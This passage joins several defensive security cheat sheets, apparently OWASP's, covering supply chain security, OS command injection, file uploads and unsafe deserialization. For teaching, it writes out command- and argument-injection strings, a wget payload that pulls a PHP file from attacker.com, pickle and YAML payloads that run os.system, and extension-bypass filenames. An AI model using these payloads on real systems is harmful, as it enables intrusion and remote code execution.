The characteristics of threat actors seeking exploit the SSC are similarly diverse. Although SSC compromise is often associated with highly sophisticated threat actors, such sophistication is not inherently necessary for attacking the SSC, especially if the attack focuses on compromising the SSC of entities with poor security practices. Threat actor motive also varies widely, A SSC exploit can result in loss of confidentiality, integrity, and/or availability of any organization's assets and thus fulfill a wide range of attacker goals such as espionage or financial gain.

Finally, it must be recognized that many SSC threats have the capability to propagate across many entities. This is due to consumer-supplier relationship that is integral to an SSC. For example, uf a large-scale software supplier, whether proprietary or open-source, is compromised, many downstream, consuming entities could also be impacted as a result. The 2020 SolarWinds and 2021 Codecov incidents are excellent real-world examples of this.

## Mitigations and Security Best Practices

Mitigating SSC related risk can seem daunting, yet it need not be. Even for sophisticated attacks that may focus on compromising upstream suppliers, individual organization can take reasonable steps to defend its own assets and mitigate risk even if its supplier is compromised. Although some parts of SSCS may remain outside direct control of development teams, those teams must still do their part to improve SSCS in their organization; the guidance below is intended as starting point for developers to do just that.

### General

The practices described below are general techniques that can be used to mitigate risk related to a wide variety of threat types.

#### Implement Strong Access Control

  Compromised accounts, particularly privileged ones, represents a significant threats to SSCs. Account takeover can allow an attacker can perform a variety of malicious acts including injecting code into legitimate dependencies, manipulating CI/CD pipeline execution, and replacing a benign artifact with a malicious one. Strong access control for build, development, version control, and similar environments is thus critical. Best practices include adhering to  the basic security principles of least privileges and separation of duties, enforcing MFA, rotating credentials, and ensuring credentials are never stored or transmitted in clear text or committed to source control.

#### Logging and Monitoring

  When considering SSCS, the importance of detective controls should not be overlooked; these controls are essential for detecting attacks and enabling prompt respond. In the context of SSCS, logging is critical. All systems involved in the SSC, including VCS, build tools, delivery mechanisms, artifact repositories, and the systems responsible for running applications should be configured to log authentication attempts, configuration changes, and other events that could assist in identifying anomalous behavior or that could prove crucial for incident response efforts. Logs throughout the SSC must be sufficient in both depth and breadth to support detection and response

  However, logging events is not sufficient. These logs must be monitored, and, if necessary, acted upon. A centralized SIEM, log aggregator, or similar tool is preferred, especially given the complexity of SSCs. Regardless of the technology used, the basic objective remains the same: log data should be actionable.

#### Leverage Security Automation

For complex SSCs, automation of security tasks, such as scanning, monitoring, and testing is critical. Such automation, while not a replacement for manual reviews and other actions performed by skilled professionals, is capable of detecting, and in some cases responding to, vulnerabilities and potential attacks with a scale and consistency that is hard to achieve through manual human intervention. Types of tools that support automation include SAST, DAST, SCA, container image scanners and more. The exact tools most capable of delivering value to an organization will vary significantly based on the characteristics of the organization. However, regardless of the type of tools and vendors used, it is important to acknowledge that these tools themselves must be mainlined, secured, and configured correctly. Failure to do so could actually increase SSC risk for an organization, or at the very least, fail to bring meaningful benefit to the organization. Finally, it must be clearly understood that these tools are but one component of an overall SSCS program; they cannot be considered a comprehensive solution or be relied on to identify all vulnerabilities.

### Mitigating Source Code Threats

The practices described below can help reduce SSC risk associated with source code and development.

#### Peer Reviews

Manual code reviews are an important, relatively low cost technique for reducing SSC risk; these reviews can act as both detective controls and deterrents. Reviews should be performed by peers possessing both experience in the technology being used and secure coding processes and should occur before code is merged within a source control systems [[3](#references)]. The reviews should look for both unintentional security flaws as well as intentional code that could serve malicious purposes. The results of the review should be documented for later review if needed.

#### Secure Config of Version Control Systems

Compromise or abuse of the source control system is consistently recognized as a significant SSC risk [[4,5](#references)]. The general security best practices of strong access control and logging and monitoring are two methods to help secure VCS. Security features specific to the VCS system, such as protected branches and merge policies in git, should also be leveraged. You can find a wide variety of recommended policies in this [documentation](https://policies.legitify.dev/). There are tools available to help manage configuration of SCM systems, such as [Legitify](https://github.com/Legit-Labs/legitify), an open-source tool by [Legit security](https://www.legitsecurity.com/). Legitify is designed to detect misconfigurations in GitHub and GitLab and assist with the implementation of best practices. Regardless of any security controls added a VCS, it must be remember that secrets should never be committed to these systems.

#### Secure Development Platform

IDEs, development plugins, and similar tools can help assist the development process. However, like all pieces of software, these components can have vulnerabilities and become an attack vector. Thus, it is important to take steps not only to ensure these tools are used securely, but also to secure the underlying system. The development system should have endpoint security software installed and should have threat assessments performed against it [[2](#references)]. Only trusted, well-vetted software should be used in the development process; this includes not only "core" development tools such as IDEs, but also any plugins or extensions.  Additionally, these tools should be included as part of an organization's system inventory.

### Mitigating Dependency Threats

Best practices and techniques related to secure use of dependencies are described below.

#### Assess Suppliers

Before incorporating a third-party service, product, or software component into the SSC, the vendor and specific offering should both be thoroughly assessed for security. This applies to both open-source and proprietary offerings. The form and extent of the analysis will vary substantially in accordance with both the criticality and nature of the component being considered. Component maturity, security history, and the vendor's response to past vulnerabilities are useful information in nearly any case. For larger vendors or service offerings, determining whether or not a solution has been evaluated against third-party assessments and certifications, such as those performed against [FedRAMP](https://marketplace.fedramp.gov/products), [CSA](https://cloudsecurityalliance.org/star/registry), or various ISO standards (ISO/IEC 27001, ISO/IEC 15408,
ISO/IEC 27034), can be a useful data point, but must not be relied on exclusively.

Due to its transparent nature, open-source projects offer additional assessment opportunities. Questions to consider include [[6](#references)]:

- Is the project actively maintained?
- Is the project sufficiently popular and well-known in the applicable community?
- Is the project sufficiently mature?
- Is the product or version being evaluated a "release" version, e.g. not an alpha, beta, or comparable versions?
- Given the complexity of the project, does the project have a sufficient number of maintainers and contributors?
- Does the project keep its dependencies updated?
- Does the project have sufficient test coverage and do the tests include security relevant rules?
- Is the project well-documented and does the document include guidance on how to use the component securely?
- Does the project have an established and documented process for reporting vulnerabilities and are these vulnerabilities addressed in a timely manner?
- Is the intended usage of the project consistent with the project's license?

#### Understand and Monitor Software Dependencies

While third-party software dependencies can greatly accelerate the development process, they are also one of the leading risks associated with modern applications. Dependencies must not only be carefully selected before they are incorporated into an application, but also carefully monitored and maintained throughout the SDLC. In order achieve this, having insight into the various dependencies consumed by software is a crucial first step. To facilitate this, SBOMs may be used. Both production and consumption of these SBOMs should be automated, preferably as part of the  organization's CI/CD process.

Once the organization has inventoried dependencies, it must also monitor them for known vulnerabilities. This should also be automated as much as possible; tools such as [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/) or [retire.js](https://retirejs.github.io/retire.js/) can assist in this process. Additionally, sources such as the [NVD](https://nvd.nist.gov/), [OSVDB](https://osv.dev/list), or [CISA KEV catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) may also be monitored for known vulnerabilities related to dependencies used in the organization's SSC.

#### SAST

Although using SAST to detect potential security in custom developed code is a widely used security technique, it can also be used on OSS components within the SSC [[2](#references)]. As when using SAST on internally developed code, one must recognize that these tools can produce both false positives and false negatives. Thus, SAST results must not be accepted without manual verification and should not be interpreted as providing a comprehensive view of the project's security. However, as long as their limitations are understood, SAST scans can prove useful when analyzing both internally developed or OSS code.

#### Lockfile/Version Pinning

To reduce the likelihood that a compromised or vulnerable version is unwittingly pulled into an application, one should limit the applications dependencies to a specific version that has been previously verified as legitimate and secure. This is commonly accomplished using lockfiles such as the package-lock.json file used by npm.

### Build Threats

The section below describes techniques that are especially relevant for securing build related threats.

#### Inventory Build Tools

Knowing the components used in the SSC is essential to the security of that SSC. This concept extends to build tools. An inventory of all build tools, including versions and any plugins, should be automatically collected and mainlined, One must also monitor vulnerability databases, vendor security advisories and other sources for any vulnerabilities related to the identified build tools.

#### Harden Build Tools

Compromised build tools can enable a wide range of exploits and thus represent an appealing target for attackers. As such, all infrastructure and tools used in build process must be hardened to mitigate risk. Techniques for hardening build environments include [[2](#references)]:

- Ensure build tools are located in an appropriately segregated networks.
- Use DLP and other tools and techniques to detect and prevent exfiltration.
- Disable/remove any unused services.
- Use version control systems to manage and store pipeline configurations.

#### Enforce Code Signing

From a the perspective of software consumers, only accepting components which have been digitally signed and validating the signature before utilizing the software is an important task step in ensuring the component is authentic and has not been tampered with. For those performing code signing, it is imperative that the code signing infrastructure is thoroughly hardened. Failure to do so can result in compromise of the code signing system and lead further exploits, including those targeting consumers of the software.

#### Use Private Artifact Repository

Using a private artifact repository increases the control an organization has over the various artifacts that are used within the SSC. Artifacts should be reviewed before being allowed in the private repository and organizations must ensure that usage of these repositories cannot be bypassed. Although usage of private repositories can introduce extra maintenance or reduce agility, they can also be an important component of SSCS, especially for sensitive or critical applications.

#### Use Source Control for Build Scripts and Config

The benefits of VCSs can be realized for items beyond source control; this is especially true for config and scripts related to CI/CD pipelines. Enforcing version control for these files allows one to incorporate reviews, merge rules, and like controls into the config update process. Using VCS also increase visibility, allowing one easy visibility into any changes introduced, whether malicious or benign [[2](#references)].

#### Verify Provenance/Ensure Sufficient Metadata is Generated

Having assurance that an SSC component comes from a trusted source and has not been tampered with is a important part of SSCS. Generation and consumption of provenance, defined in [SLSA 1.0](https://slsa.dev/spec/v1.0/provenance) as "the verifiable information about software artifacts describing where, when and how something was produced" is an important part of this. The provenance should be generated by the build platform (as opposed to a local development system), be very difficult for attackers to forge, and contain all details necessary to accurately link the result back to the builder [[7](#references)]. SLSA 1.0 compliant provenance can be generated using builders such as [FRSCA](https://github.com/buildsec/frsca) or [Github Actions](https://github.com/slsa-framework/slsa-github-generator) and verified [using SLSA Verifier](https://github.com/slsa-framework/slsa-verifier?tab=readme-ov-file)

#### Ephemeral, Isolated Builds

Reuse and sharing of build environments may allow attackers to perform cache poising or otherwise more readily inject malicious code.  Builds should be performed in isolated, temporary ("ephemeral") environments. This can be achieved using technologies such as VMs or containers for builds and ensuring the environment is immediately destroyed afterward.

#### Limit use of Parameters

Although passing user controllable parameters to a build process can increase flexibility, it also increases risk. If parameters can be modified by users in order to alter how a build is performed, an attacker with sufficient permission will also be able to modify the parameters and potentially compromise the build process [[8](#references)]. One should thus make an effort to minimize or eliminate any user controllable build parameters.

### Deployment and Runtime Threats

The section below outlines a couple of techniques that can be used to protect software during the deployment and runtime phases.

#### Scan Final Build Binary

Once the build process has finished, one should not simply assume that the final result is secure. Binary composition analysis can help detect exposed secrets, detect unauthorized components or content, and verify integrity [[2](#references)]. This task should be performed by both suppliers and consumers.

#### Monitor Deployed Software for Vulnerabilities

SSCS does not end with the deployment of the software; the deployed software must be monitored and maintained to reduce risk. New vulnerabilities, whether introduced due to an update or simply newly discovered (or made public), are a continual concern in software systems [[4](#references)]. When performing this monitoring, a wholistic approached must be used; code dependencies, container images, web servers, and operating system components are just a sampling of items that must be consider. To support this monitoring, an accurate and up-to-date inventory of system components is critical. Additionally, insecure configuration changes must be monitored and acted upon.

## References

1. [NIST SP 800-204D: Strategies for the Integration of Software Supply Chain Security in DevSecOps CI/CD Pipelines](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204D.pdf)
2. [Securing the Software Supply Chain: Recommended Practices Guide for Developers](https://media.defense.gov/2022/Sep/01/2003068942/-1/-1/0/ESF_SECURING_THE_SOFTWARE_SUPPLY_CHAIN_DEVELOPERS.PDF)
3. [Google Cloud Software Supply Chain Security: Safeguard Source](https://cloud.google.com/software-supply-chain-security/docs/safeguard-source)
4. [Google Cloud Software Supply Chain Security: Attack Vectors](https://cloud.google.com/software-supply-chain-security/docs/attack-vectors)
5. [SLSA 1.0: Threats](https://slsa.dev/spec/v1.0/threats)
6. [OpenSSF: Concise Guide for Evaluating Open Source Software](https://best.openssf.org/Concise-Guide-for-Evaluating-Open-Source-Software)
7. [SLSA 1.0: Requirements](https://slsa.dev/spec/v1.0/requirements#provenance-generation)
8. [Google Cloud Security Supply Chain Security: Safeguard Builds](https://cloud.google.com/software-supply-chain-security/docs/safeguard-builds)


---
# OS_Command_Injection_Defense_Cheat_Sheet.md

# OS Command Injection Defense Cheat Sheet

## Introduction

Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.

For example, if the supplied value is:

``` shell
calc
```

when typed in a Windows command prompt, the application *Calculator* is displayed.

However, if the supplied value has been tampered with, and now it is:

``` shell
calc & echo "test"
```

when executed, it changes the meaning of the initial intended value.

Now, both the *Calculator* application and the value *test* are displayed:

![CommandInjection](../assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)

The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.

### Argument Injection

Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.

For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.

```php

system("curl " . escape($url));
```

which will prevent an attacker to run other commands.

However, if the attacker controlled string contains an additional argument of the `curl` command:

```php

system("curl " . escape("--help"))
```

Now when the above code is executed, it will show the output of `curl --help`.

Depending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.

## Primary Defenses

### Defense Option 1: Avoid calling OS commands directly

The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.

For example use `mkdir()` instead of `system("mkdir /dir_name")`.

If there are available libraries or APIs for the language you use, this is the preferred method.

### Defense option 2: Escape values added to OS commands specific to each OS

**TODO: To enhance.**

For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.

The `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo "hello"`, the final output will be like `calc '& echo "hello"'` which will be parsed as a single argument to the command `calc`.

Even though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.

### Defense option 3: Parameterization in conjunction with Input Validation

If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:

#### Layer 1

**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.

#### Layer 2

**Input validation:** The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:

- When it comes to the **commands** used, these must be validated against a list of allowed commands.
- In regards to the **arguments** used for these commands, they should be validated using the following options:
    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`
- According to **Guideline 10** of this [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html), *The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.* For example, `curl -- $url` will prevent an argument injection even if the `$url` is malformed and contains an additional argument.

**Note A:**

```text
& |  ; $ > < ` \ ! ' " ( )
```

## Additional Defenses

On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.

These additional defenses are:

- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.
- If possible, create isolated accounts with limited privileges that are only used for a single task.

## Code examples

### Java

In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.

*Note about the Java's `Runtime.exec` method behavior:*

There are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.

However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.

**`Runtime.exec` does NOT try to invoke the shell at any point and does not support shell metacharacters**.

The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.

*Code to test the note above:*

``` java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```

*Result of the test:*

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```

*Incorrect usage:*

```java
ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
```

In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.

*Correct Usage:*

Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.

``` java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```

### .Net

See relevant details in the [DotNet Security Cheat Sheet](DotNet_Security_Cheat_Sheet.md#os-injection)

### PHP

PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.

`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.

`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.

It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.

For example, consider this code using `wget` with `escapeshellcmd()`:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```

If the user provides:

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```

`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.

The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```

Now the malicious input becomes:

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```

Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.

In addition, it is good security practice to follow these recommendations:  

- **Hardcode the command**: never allow the user to choose which executable to run.  
- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.  
- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.

## Related articles

### Description of Command Injection Vulnerability

- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection).

### How to Avoid Vulnerabilities

- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177).

### How to Review Code

- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection).

### How to Test

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html).

### External References

- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html).


---
# File_Upload_Cheat_Sheet.md

# File Upload Cheat Sheet

## Introduction

File upload is becoming a more and more essential part of any application, where the user is able to upload their photo, their CV, or a video showcasing a project they are working on. The application should be able to fend off bogus and malicious files in a way to keep the application and the users safe.

In short, the following principles should be followed to reach a secure file upload implementation:

- **List allowed extensions. Only allow safe and critical extensions for business functionality**
    - **Ensure that [input validation](Input_Validation_Cheat_Sheet.md#file-upload-validation) is applied before validating the extensions.**
- **Validate the file type, don't trust the [Content-Type header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) as it can be spoofed**
- **Change the filename to something generated by the application**
- **Set a filename length limit. Restrict the allowed characters if possible**
- **Set a file size limit**
- **Only allow authorized users to upload files**
- **Store the files on a different server. If that's not possible, store them outside of the webroot**
    - **In the case of public access to the files, use a handler that gets mapped to filenames inside the application (someid -> file.ext)**
- **Run the file through an antivirus or a sandbox if available to validate that it doesn't contain malicious data**
- **Run the file through CDR (Content Disarm & Reconstruct) if applicable type (PDF, DOCX, etc...)**
- **Ensure that any libraries used are securely configured and kept up to date**
- **Protect the file upload from [CSRF](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md) attacks**

## File Upload Threats

In order to assess and know exactly what controls to implement, knowing what you're facing is essential to protect your assets. The following sections will hopefully showcase the risks accompanying the file upload functionality.

### Malicious Files

The attacker delivers a file for malicious intent, such as:

1. Exploit vulnerabilities in the file parser or processing module (_e.g._ [ImageTrick Exploit](https://imagetragick.com/), [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing))
2. Use the file for phishing (_e.g._ careers form)
3. Send ZIP bombs, XML bombs (otherwise known as billion laughs attack), or simply huge files in a way to fill the server storage which hinders and damages the server's availability
4. Overwrite an existing file on the system
5. Client-side active content (XSS, CSRF, etc.) that could endanger other users if the files are publicly retrievable.

### Public File Retrieval

If the file uploaded is publicly retrievable, additional threats can be addressed:

1. Public disclosure of other files
2. Initiate a DoS attack by requesting lots of files. Requests are small, yet responses are much larger
3. File content that could be deemed as illegal, offensive, or dangerous (_e.g._ personal data, copyrighted data, etc.) which will make you a host for such malicious files.

## File Upload Protection

There is no silver bullet in validating user content. Implementing a defense in depth approach is key to make the upload process harder and more locked down to the needs and requirements for the service. Implementing multiple techniques is key and recommended, as no one technique is enough to secure the service.

### Extension Validation

Ensure that the validation occurs after decoding the filename, and that a proper filter is set in place in order to avoid certain known bypasses, such as the following:

- Double extensions, _e.g._ `.jpg.php`, where it circumvents easily the regex `\.jpg`
- Null bytes, _e.g._ `.php%00.jpg`, where `.jpg` gets truncated and `.php` becomes the new extension
- Generic bad regex that isn't properly tested and well reviewed. Refrain from building your own logic unless you have enough knowledge on this topic.

Refer to the [Input Validation CS](Input_Validation_Cheat_Sheet.md) to properly parse and process the extension.

#### List Allowed Extensions

Ensure the usage of _business-critical_ extensions only, without allowing any type of _non-required_ extensions. For example if the system requires:

- image upload, allow one type that is agreed upon to fit the business requirement;
- cv upload, allow `docx` and `pdf` extensions.

Based on the needs of the application, ensure the **least harmful** and the **lowest risk** file types to be used.

#### Block Extensions

Identify potentially harmful file types and block extensions that you regard harmful to your service.

Please be aware that blocking specific extensions is a weak protection method on its own. The [Unrestricted File Upload vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) article describes how attackers may attempt
to bypass such a check.

### Content-Type Validation

_The Content-Type for uploaded files is provided by the user, and as such cannot be trusted, as it is trivial to spoof. Although it should not be relied upon for security, it provides a quick check to prevent users from unintentionally uploading files with the incorrect type._

Other than defining the extension of the uploaded file, its MIME-type can be checked for a quick protection against simple file upload attacks.

This can be done preferably in an allowlist approach; otherwise, this can be done in a denylist approach.

### File Signature Validation

In conjunction with [content-type validation](#content-type-validation), validating the file's signature can be checked and verified against the expected file that should be received.

> This should not be used on its own, as bypassing it is pretty common and easy.

### Filename Safety

Filenames can endanger the system in multiple ways, either by using non acceptable characters, or by using special and restricted filenames. For Windows, refer to the following [MSDN guide](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN#naming-conventions). For a wider overview on different filesystems and how they treat files, refer to [Wikipedia's Filename page](https://en.wikipedia.org/wiki/Filename).

In order to avoid the above mentioned threat, creating a **random string** as a filename, such as generating a UUID/GUID, is essential. If the filename is required by the business needs, proper input validation should be done for client-side (_e.g._ active content that results in XSS and CSRF attacks) and back-end side (_e.g._ special files overwrite or creation) attack vectors. Filename length limits should be taken into consideration based on the system storing the files, as each system has its own filename length limit. If user filenames are required, consider implementing the following:

- Implement a maximum length
- Restrict characters to an allowed subset specifically, such as alphanumeric characters, hyphen, spaces, and periods
    - Consider telling the user what an acceptable filename is.
    - Restrict use of leading periods (hidden files) and sequential periods (directory traversal).
    - Restrict the use of a leading hyphen or spaces to make it safer to use shell scripts to process files.
    - If this is not possible, block-list dangerous characters that could endanger the framework and system that is storing and using the files.

### File Content Validation

As mentioned in the [Public File Retrieval](#public-file-retrieval) section, file content can contain malicious, inappropriate, or illegal data.

Based on the expected type, special file content validation can be applied:

- For **images**, applying image rewriting techniques destroys any kind of malicious content injected in an image; this could be done through [randomization](https://security.stackexchange.com/a/8625/118367).
- For **Microsoft documents**, the usage of [Apache POI](https://poi.apache.org/) helps validating the uploaded documents.
- **ZIP files** are not recommended since they can contain all types of files, and the attack vectors pertaining to them are numerous.

The File Upload service should allow users to report illegal content, and copyright owners to report abuse.

If there are enough resources, manual file review should be conducted in a sandboxed environment before releasing the files to the public.

Adding some automation to the review could be helpful, which is a harsh process and should be well studied before its usage. Some services (_e.g._ Virus Total) provide APIs to scan files against well known malicious file hashes. Some frameworks can check and validate the raw content type and validating it against predefined file types, such as in [ASP.NET Drawing Library](https://docs.microsoft.com/en-us/dotnet/api/system.drawing.imaging.imageformat). Beware of data leakage threats and information gathering by public services.

### File Storage Location

The location where the files should be stored must be chosen based on security and business requirements. The following points are set by security priority, and are inclusive:

1. Store the files on a **different host**, which allows for complete segregation of duties between the application serving the user, and the host handling file uploads and their storage.
2. Store the files **outside the webroot**, where only administrative access is allowed.
3. Store the files **inside the webroot**, and set them in write permissions only.
   - If read access is required, setting proper controls is a must (_e.g._ internal IP, authorized user, etc.)

Storing files in a studied manner in databases is one additional technique. This is sometimes used for automatic backup processes, non file-system attacks, and permissions issues. In return, this opens up the door to performance issues (in some cases), storage considerations for the database and its backups, and this opens up the door to SQLi attack. This is advised only when a DBA is on the team and that this process shows to be an improvement on storing them on the file-system.

> Some files are emailed or processed once they are uploaded, and are not stored on the server. It is essential to conduct the security measures discussed in this sheet before doing any actions on them.

### User Permissions

Before any file upload service is accessed, proper validation should occur on two levels for the user uploading a file:

- Authentication level
    - The user should be a registered user, or an identifiable user, in order to set restrictions and limitations for their upload capabilities
- Authorization level
    - The user should have appropriate permissions to access or modify the files

### Filesystem Permissions

> Set the files permissions on the principle of least privilege.

Files should be stored in a way that ensures:

- Allowed system users are the only ones capable of reading the files
- Required modes only are set for the file
    - If execution is required, scanning the file before running it is required as a security best practice, to ensure that no macros or hidden scripts are available.

### Upload and Download Limits

The application should set proper size limits for the upload service in order to protect the file storage capacity. If the system is going to extract the files or process them, the file size limit should be considered after file decompression is conducted and by using secure methods to calculate zip files size. For more on this, see how to [Safely extract files from ZipInputStream](https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream), Java's input stream to handle ZIP files.

The application should set proper request limits as well for the download service if available to protect the server from DoS attacks.

## Java Code Snippets

[Document Upload Protection](https://github.com/righettod/document-upload-protection) repository written by Dominique for certain document types in Java.


---
# Access_Control_Cheat_Sheet.md

# DEPRECATED: Access Control Cheatsheet

The Access Control cheatsheet has been deprecated.

Please visit the [Authorization Cheatsheet](Authorization_Cheat_Sheet.md) instead.


---
# Deserialization_Cheat_Sheet.md

# Deserialization Cheat Sheet

## Introduction

This article is focused on providing clear, actionable guidance for safely deserializing untrusted data in your applications.

## What is Deserialization

**Serialization** is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them for storage, or to send as part of communications.

**Deserialization** is the reverse of that process, taking data structured in some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

However, many programming languages have native ways to serialize objects. These native formats usually offer more features than JSON or XML, including customization of the serialization process.

Unfortunately, the features of these native deserialization mechanisms can sometimes be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, or remote code execution (RCE) attacks.

## Guidance on Deserializing Objects Safely

The following language-specific guidance attempts to enumerate safe methodologies for deserializing data that can't be trusted.

### PHP

#### Clear-box Review

Check the use of [`unserialize()`](https://www.php.net/manual/en/function.unserialize.php) function and review how the external parameters are accepted. Use a safe, standard data interchange format such as JSON (via `json_decode()` and `json_encode()`) if you need to pass serialized data to the user.

### Python

#### Opaque-box Review

If the traffic data contains the symbol dot `.` at the end, it's very likely that the data was sent in serialization. It will be only true if the data is not being encoded using Base64 or Hexadecimal schemas. If the data is being encoded, then it's best to check if the serialization is likely happening or not by looking at the starting characters of the parameter value. For example if data is Base64 encoded, then it will most likely start with `gASV`.

#### Clear-box Review

The following API in Python will be vulnerable to serialization attack. Search code for the pattern below.

1. The uses of `pickle/c_pickle/_pickle` with `load/loads`:

```python
import pickle
data = """ cos.system(S'dir')tR. """
pickle.loads(data)
```

2. Uses of `PyYAML` with `load`:

```python
import yaml
document = "!!python/object/apply:os.system ['ipconfig']"
print(yaml.load(document))
```

3. Uses of `jsonpickle` with `encode` or `store` methods.

### Java

The following techniques are all good for preventing attacks against deserialization against [Java's Serializable format](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html).

Implementation advice:

- In your code, override the `ObjectInputStream#resolveClass()` method to prevent arbitrary classes from being deserialized. This safe behavior can be wrapped in a library like [SerialKiller](https://github.com/ikkisoft/SerialKiller).
